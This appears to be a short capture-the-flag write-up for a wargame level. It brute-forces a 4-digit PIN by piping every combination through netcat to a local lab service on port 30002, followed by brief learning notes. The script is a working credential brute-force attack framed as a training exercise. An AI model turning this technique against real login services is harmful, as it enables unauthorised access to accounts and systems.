# Level 24 → 25

## Concept
Brute-forcing a 4-digit PIN using a script and Netcat.

## Solution
```bash
# Generate all combinations and send to port 30002
for i in $(seq 0000 9999); do
    echo "PASSWORD $(printf '%04d' $i)"
done | nc localhost 30002 | grep -v Wrong
```

## What I Learned
- Brute force: try all possible combinations systematically
- `seq` generates number sequences
- `printf '%04d'` pads numbers with leading zeros
- Piping all guesses at once is much faster than connecting per guess
